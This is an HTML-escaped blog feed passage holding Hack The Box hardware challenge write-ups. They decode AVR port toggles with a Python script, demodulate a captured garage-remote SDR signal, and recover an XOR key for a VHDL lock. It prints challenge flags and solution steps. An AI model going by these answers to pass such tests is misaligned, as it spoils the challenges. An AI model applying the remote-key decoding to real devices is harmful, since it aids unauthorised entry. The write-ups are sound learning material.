srcset="https://Kvn11.github.io/p/bare-metal/img/img_3_hua2f673180a250a5ffd6860579d614014_18242_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/bare-metal/img/img_3_hua2f673180a250a5ffd6860579d614014_18242_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Registers"
class="gallery-image"
data-flex-grow="863"
data-flex-basis="2071px"
>&lt;/p>
&lt;p>The &lt;code>cbi&lt;/code> instruction clears a bit in the register, and &lt;code>sbi&lt;/code> sets the bit.
Reading about the pin configuration reveals more information as well.&lt;/p>
&lt;blockquote>
&lt;p>The DDxn bit in the DDRx register selects the direction of this pin.
If DDxn is written logic one, Pxn is configured as an output pin.
If DDxn is written logic zero, Pxn is configured as an input pin.&lt;/p>
&lt;/blockquote>
&lt;p>Thus based on this, we know that the instruction at address &lt;code>0x86&lt;/code> is writing logic zero to &lt;code>DDD4&lt;/code>, meaning that &lt;code>PIND4&lt;/code> is configured as an input pin.
However, this isn&amp;rsquo;t as interesting as the data being written to the &lt;code>PORTD&lt;/code> data register, which presumably holds the data to be sent as output.
The instructions:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">54 98 cbi 0x0a, 4 ; 10
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">5f 9a sbi 0x0b, 7 ; 11
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">5f 98 cbi 0x0b, 7 ; 11
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>seems to clear the USART internal clock, then seems to toggle bit 7 of Port D, which can either be the analog comparator negative input, or the pin change interrupt source 23.
I wrote a python script to visualize the changes in the register bits for the rest of the instructions, which helped me see that Port D6 was changing in a repeated pattern, while Port D5 was not changing in a discernable pattern.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/bare-metal/img/img_4.png"
width="835"
height="55"
srcset="https://Kvn11.github.io/p/bare-metal/img/img_4_hude9e9e9b5421173dcb3064d4291cce47_16504_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/bare-metal/img/img_4_hude9e9e9b5421173dcb3064d4291cce47_16504_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Pattern is visible"
class="gallery-image"
data-flex-grow="1518"
data-flex-basis="3643px"
>&lt;/p>
&lt;p>Bit 6 seems to be alternating between 0 and 1 so I don&amp;rsquo;t think it would have anything interesting to show.
Since bit 5 looks more random, I decided to try figure out what it creates.
Since this is probably transmitting over UART or some type of serial interface, I figured I should start there for visualizing it.&lt;/p>
&lt;p>In the end, this was my solution for pulling getting the flag.
For the script to work, you need to isolate the big chunk of &lt;code>cbi&lt;/code> and &lt;code>sbi&lt;/code> instructions and ignore the others.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-Python3" data-lang="Python3">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/usr/bin/python3&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">():&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bit_5&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bit_6&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">lines&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;disassembly.txt&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">lines&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">readlines&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">instr&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">lines&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">op&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">reg&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bit&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">process_instr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">op&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;cbi&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">bit&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bit_5&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">bit&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">6&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bit_6&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">op&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;sbi&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">bit&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bit_5&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">bit&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">6&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bit_6&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ctr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">b_string&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">characters&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">b&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">bit_5&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">b_string&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ctr&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">ctr&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">characters&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">b_string&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">b_string&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ctr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">characters&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">process_instr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instr&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">values&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">instr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">strip&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">op&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">values&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">operands&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">values&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;, &amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">op&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">operands&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">operands&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">cbi_1&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">register&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bit&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">register&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">sbi_1&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">register&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bit&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">register&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">main&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>The flag is: &lt;code>HTB{817_84n91n9_15_3v32ywh323!@#$%}&lt;/code>&lt;/p></description></item><item><title>HTB HW Challenge RFlag</title><link>https://Kvn11.github.io/p/htb-hw-challenge-rflag/</link><pubDate>Thu, 04 May 2023 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/htb-hw-challenge-rflag/</guid><description>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/hackthebox.jpg" alt="Featured image of post HTB HW Challenge RFlag" />&lt;blockquote>
&lt;p>&lt;strong>Challenge Description&lt;/strong>: We have found the garage where some cyber criminals have all their stuff.
Using an SDR device, we captured the signal from the remote key that opens the garage.
Can you help us to analyze it?&lt;/p>
&lt;/blockquote>
&lt;h2 id="walkthrough">Walkthrough
&lt;/h2>&lt;p>The challenge zip file contains &lt;code>signal.cf32&lt;/code> which can be opened with inspectrum.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_1.png"
width="1258"
height="598"
srcset="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_1_hu833c2a68a9ff553eddcfc75dd92c4059_1151536_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_1_hu833c2a68a9ff553eddcfc75dd92c4059_1151536_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Opened signal capture"
class="gallery-image"
data-flex-grow="210"
data-flex-basis="504px"
>&lt;/p>
&lt;p>We can increase the FFT size, power max, and power min settings to get a more clear view of the signals.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_2.png"
width="1258"
height="719"
srcset="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_2_hu8ef0c633dd5f362bd3828bff3e270cb9_92176_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_2_hu8ef0c633dd5f362bd3828bff3e270cb9_92176_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Better view"
class="gallery-image"
data-flex-grow="174"
data-flex-basis="419px"
>&lt;/p>
&lt;p>Then we can right click on the bright signal segments and add an amplitude plot.
We need to shrink our window to reduce noise.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_3.png"
width="1919"
height="1034"
srcset="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_3_hu7a0d62733e874bd05ec1bc554e21d67a_134230_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_3_hu7a0d62733e874bd05ec1bc554e21d67a_134230_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Amplitude plot"
class="gallery-image"
data-flex-grow="185"
data-flex-basis="445px"
>&lt;/p>
&lt;p>Now we right click on our amplitude plot, and select &lt;code>Add derived plot -&amp;gt; add threshold plot&lt;/code> to get our plot of 1&amp;rsquo;s and 0&amp;rsquo;s.
We also enable the cursors so we can start describing what will determine a 1 and what will determine a 0.
Then we can increase the amount of cursors until we have covered the entire capture.
Doesn&amp;rsquo;t need to be perfectly lined up.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_4.png"
width="1919"
height="1034"
srcset="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_4_hu57485597eaf5a9c97f9f439974a8cdbf_724526_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_4_hu57485597eaf5a9c97f9f439974a8cdbf_724526_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Creating our bits"
class="gallery-image"
data-flex-grow="185"
data-flex-basis="445px"
>&lt;/p>
&lt;p>To export the bits, we need to right click on the threshold plot, and then select extract symbols to stdout.
I removed the whitespace and comma&amp;rsquo;s so that I could use it with an online machenster decoding tool.
You can figure out this is manchester encoded due to the bit patterns.
The bits are always going from high to low, or low to high, but never high to high or low to low.
You can use &lt;a class="link" href="https://dcode.fr/manchester-code" target="_blank" rel="noopener"
>dcode.fr/manchester-code&lt;/a> to decode the bits into their final form.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_5.png"
width="990"
height="503"
srcset="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_5_hue12044070bd80f8d25532e4d8fe338a7_208850_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_5_hue12044070bd80f8d25532e4d8fe338a7_208850_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Manchester decoded"
class="gallery-image"
data-flex-grow="196"
data-flex-basis="472px"
>&lt;/p>
&lt;p>After we have the final decoded bits, we can use CyberChef to convert the bits to text.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_6.png"
width="1140"
height="534"
srcset="https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_6_huc87c1bdbf6611403c71799c2524e3c4d_40563_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/img_6_huc87c1bdbf6611403c71799c2524e3c4d_40563_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Flag"
class="gallery-image"
data-flex-grow="213"
data-flex-basis="512px"
>&lt;/p></description></item><item><title>HTB HW Challenge VHDLock</title><link>https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/</link><pubDate>Wed, 03 May 2023 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/</guid><description>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/img/hackthebox.jpg" alt="Featured image of post HTB HW Challenge VHDLock" />&lt;blockquote>
&lt;p>&lt;strong>Challenge Description&lt;/strong>: We found ourselves locked in an escape room, with the clock ticking down and only one puzzle to solve.
The final challenge involves opening the door, and the clue provided to use by the game master is that the key for the encrypted password is a 4-byte sequence.&lt;/p>
&lt;/blockquote>
&lt;h2 id="walkthrough">Walkthrough
&lt;/h2>&lt;p>The challenge download gives us two files &lt;code>lock.vhd&lt;/code> and &lt;code>out.txt&lt;/code>.
The second file is presumably the output of the first, and contains two columns of values.
At first glance the first file appears to be a Virtual Hard Disk, but based on the name of the challenge and a quick search of the import &lt;code>use ieee.std_logic_1164.all&lt;/code>, it can be determined that this is a VHDL file.
If you want to learn more about VHDL files, and how to write/read them, I recommend this playlist:
&lt;a class="link" href="https://www.youtube.com/watch?v=h4ZXge1BE80" target="_blank" rel="noopener"
>Your first VHDL Program&lt;/a>.&lt;/p>
&lt;p>The first part of this file is creating an &lt;code>xor_get&lt;/code> function that takes 2 inputs, each 2 bytes wide, XOR&amp;rsquo;s them, and outputs the 2 byte result to &lt;code>output&lt;/code>.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/img/1.png"
width="734"
height="376"
srcset="https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/img/1_huedba0fb69b937a1a57823c37c7b1e252_119357_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/img/1_huedba0fb69b937a1a57823c37c7b1e252_119357_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="First part of lock.vhd"
class="gallery-image"
data-flex-grow="195"
data-flex-basis="468px"
>&lt;/p>
&lt;p>The second component takes in a 4 but value and maps it to a 16 bit value. This value is given to &lt;code>output&lt;/code>.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/img/2.png"
width="858"
height="804"
srcset="https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/img/2_hu39b6a4af5a3f22aafbbe4b7c3990ca05_395412_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/img/2_hu39b6a4af5a3f22aafbbe4b7c3990ca05_395412_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Second part of lock.vhd"
class="gallery-image"
data-flex-grow="106"
data-flex-basis="256px"
>&lt;/p>
&lt;p>The last component of the file is where the process of generating &lt;code>out.txt&lt;/code> can be explained.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/img/3.png"
width="858"
height="804"
srcset="https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/img/3_hu39b6a4af5a3f22aafbbe4b7c3990ca05_395412_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/img/3_hu39b6a4af5a3f22aafbbe4b7c3990ca05_395412_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Third part of lock.vhd"
class="gallery-image"
data-flex-grow="106"
data-flex-basis="256px"
>&lt;/p>
&lt;p>The &lt;code>main&lt;/code> entity describes the inputs we can expect.
2 4-bit values, along with a 2 byte XOR key, and it will have 2 2-byte outputs, seen in &lt;code>out.txt&lt;/code>.
Our 2 4-bit values are translated into a 16-bit value, and then those values are XOR&amp;rsquo;d against the unknown key.
However, given that HackTheBox flags always have the format &lt;code>HTB{...}&lt;/code> we can assume to know the first 4 inputs.
Since we now know the 2 of the 3 values used in the XOR operation used to generate the outputs, we can derive the 4 byte key using the following process:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">output_1 ^ decoder_4x16(&amp;#34;H&amp;#34;) = 1st byte of key.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">output_2 ^ decoder_4x16(&amp;#34;T&amp;#34;) = 2nd byte of key.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">output_3 ^ decoder_4x16(&amp;#34;B&amp;#34;) = 3rd byte of key.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">output_4 ^ decoder_4x16(&amp;#34;{&amp;#34;) = 4th byte of key.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Here is the code to generate the key:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-Python" data-lang="Python">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/usr/bin/python3&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">decoder_4x16&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">signal&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cases&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">dict&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">val&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">n&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">):&lt;/span>
